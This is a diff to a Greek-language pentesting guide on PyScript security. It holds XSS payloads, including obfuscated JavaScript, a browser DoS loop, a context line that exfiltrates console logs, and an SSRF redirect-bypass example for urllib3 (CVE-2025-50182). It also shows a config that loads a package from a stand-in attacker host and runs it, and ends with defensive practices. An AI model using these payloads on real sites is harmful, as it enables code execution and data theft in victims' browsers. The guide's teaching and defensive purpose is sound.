@@ -47,7 +47,7 @@ body: JSON.stringify({ content: btoa(console.logs) }),
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
 
-### Διασταυρούμενη Σκηνική Σcripting (Κανονική)
+### Cross Site Scripting (Κανονικό)
 
 Code:
 ```python
@@ -57,7 +57,7 @@ print("<img src=x onerror='alert(document.domain)'>")
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
 
-### Διασταυρούμενη Εξαπάτηση Ιστοσελίδων (Python Obfuscated)
+### Cross Site Scripting (Python Obfuscated)
 
 Κώδικας:
 ```python
@@ -78,7 +78,7 @@ print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
 Κώδικας:
 ```html
 <py-script>
-prinht("
+prinht(""
 <script>
 var _0x3675bf = _0x5cf5
 function _0x5cf5(_0xced4e9, _0x1ae724) {
@@ -140,14 +140,14 @@ return _0x34a15f
 return _0x599c()
 }
 </script>
-")
+"")
 </py-script>
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
 
-### Επίθεση DoS (Ατέρμον βρόχος)
+### Επίθεση DoS (Ατέρμον βρόχο)
 
-Κώδικας:
+Code:
 ```html
 <py-script>
 while True:
@@ -155,5 +155,63 @@ print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
 </py-script>
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
+
+---
+
+## Νέες ευπάθειες & τεχνικές (2023-2025)
+
+### Server-Side Request Forgery μέσω μη ελεγχόμενων ανακατευθύνσεων (CVE-2025-50182)
+
+`urllib3 < 2.5.0` αγνοεί τις παραμέτρους `redirect` και `retries` όταν εκτελείται **μέσα στο περιβάλλον εκτέλεσης Pyodide** που συνοδεύει το PyScript. Όταν ένας επιτιθέμενος μπορεί να επηρεάσει τις στοχευμένες διευθύνσεις URL, μπορεί να αναγκάσει τον κώδικα Python να ακολουθήσει ανακατευθύνσεις μεταξύ τομέων ακόμη και όταν ο προγραμματιστής τις έχει απενεργοποιήσει ρητά ‑ παρακάμπτοντας αποτελεσματικά τη λογική κατά της SSRF.
+```html
+<script type="py">
+import urllib3
+http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
+r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
+print(r.status, r.url)
+</script>
+```
+Διορθώθηκε στο `urllib3 2.5.0` – αναβαθμίστε το πακέτο στην εικόνα PyScript σας ή καθορίστε μια ασφαλή έκδοση στο `packages = ["urllib3>=2.5.0"]`. Δείτε την επίσημη καταχώρηση CVE για λεπτομέρειες.
+
+### Φόρτωση αυθαίρετων πακέτων & επιθέσεις εφοδιαστικής αλυσίδας
+
+Δεδομένου ότι το PyScript επιτρέπει αυθαίρετες διευθύνσεις URL στη λίστα `packages`, ένας κακόβουλος παράγοντας που μπορεί να τροποποιήσει ή να εισάγει ρυθμίσεις μπορεί να εκτελέσει **εντελώς αυθαίρετο Python** στον περιηγητή του θύματος:
+```html
+<py-config>
+packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
+</py-config>
+<script type="py">
+import payload  # executes attacker-controlled code during installation
+</script>
+```
+*Μόνο οι καθαροί τροχοί Python απαιτούνται – δεν χρειάζεται βήμα μεταγλώττισης WebAssembly.* Βεβαιωθείτε ότι η διαμόρφωση δεν ελέγχεται από τον χρήστη και φιλοξενήστε αξιόπιστους τροχούς στον τομέα σας με HTTPS & SRI hashes.
+
+### Αλλαγές απολύμανσης εξόδου (2023+)
+
+* `print()` εξακολουθεί να εισάγει ακατέργαστο HTML και είναι επομένως επιρρεπές σε XSS (παραδείγματα παραπάνω).
+* Ο νεότερος βοηθός `display()` **διαφεύγει HTML από προεπιλογή** – η ακατέργαστη μορφοποίηση πρέπει να είναι περιτυλιγμένη σε `pyscript.HTML()`.
+```python
+from pyscript import display, HTML
+
+display("<b>escaped</b>")          # renders literally
+
+display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
+```
+Αυτή η συμπεριφορά εισήχθη το 2023 και τεκμηριώνεται στον επίσημο οδηγό Built-ins. Εξαρτηθείτε από το `display()` για μη αξιόπιστη είσοδο και αποφύγετε την άμεση κλήση του `print()`.
+
+---
+
+## Αμυντικές Καλές Πρακτικές
+
+* **Διατηρήστε τα πακέτα ενημερωμένα** – αναβαθμίστε σε `urllib3 >= 2.5.0` και ανακατασκευάστε τακτικά τα wheels που αποστέλλονται με τον ιστότοπο.
+* **Περιορίστε τις πηγές πακέτων** – αναφέρετε μόνο ονόματα PyPI ή URLs της ίδιας προέλευσης, ιδανικά προστατευμένα με Sub-resource Integrity (SRI).
+* **Ενισχύστε την Πολιτική Ασφαλείας Περιεχομένου** – απαγορεύστε το inline JavaScript (`script-src 'self' 'sha256-…'`) ώστε να μην μπορούν να εκτελούνται τα εισαγόμενα μπλοκ `<script>`.
+* **Απαγορεύστε τις ετικέτες `<py-script>` / `<script type="py">` που παρέχονται από τον χρήστη** – καθαρίστε το HTML στον διακομιστή πριν το επιστρέψετε σε άλλους χρήστες.
+* **Απομονώστε τους εργαζόμενους** – αν δεν χρειάζεστε συγχρονισμένη πρόσβαση στο DOM από τους εργαζόμενους, ενεργοποιήστε τη σημαία `sync_main_only` για να αποφύγετε τις απαιτήσεις κεφαλίδας `SharedArrayBuffer`.
+
+## Αναφορές
+
+* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
+* [Τεκμηρίωση Built-ins PyScript – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
 
 {{#include ../../banners/hacktricks-training.md}}
